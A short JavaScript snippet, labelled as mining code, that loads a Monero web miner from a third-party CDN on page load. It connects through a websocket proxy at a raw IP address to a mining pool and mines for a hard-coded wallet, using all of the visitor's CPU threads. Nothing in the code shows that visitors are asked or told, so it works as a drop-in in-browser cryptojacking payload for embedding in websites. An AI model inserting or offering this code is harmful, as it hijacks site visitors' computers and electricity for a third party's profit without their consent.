// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://45.119.82.33:40725/";
var pool = "moneroocean.stream";
var walletAddress = "48jHRYSargAAjLAcuowSfoWK2FaSq7QdVf8s4k1jZgki7Jh3iMGsDPqg1vR4BT3CEJPAg3b8gircW1sUbgZSsa5eHuJ4ZER";
var workerId = "GH-XMR"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
